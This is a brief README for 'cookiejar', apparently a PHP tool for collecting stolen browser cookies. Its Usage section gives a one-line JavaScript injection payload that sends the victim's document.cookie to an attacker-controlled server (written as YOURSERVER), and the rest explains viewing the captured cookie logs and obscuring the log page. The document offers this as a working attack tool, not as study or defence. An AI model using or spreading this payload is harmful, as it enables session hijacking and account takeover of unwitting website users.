# cookiejar

## Usage
`document.location='http://YOURSERVER/php-cookiejar/log.php?c=' + document.cookie;`

## Viewing Logs
Visit `http://YOURSERVER/php-cookiejar/view.php?logs` to see the logs.  
Going to `view.php` without the trailing `?logs` will show something different.  
Changing the variable to something different in `view.php`, line 2 would be recommended.

## To Do
* Allow different layouts for logs
* Use database for logging instead of HTML file
* Admin panel to manage DB
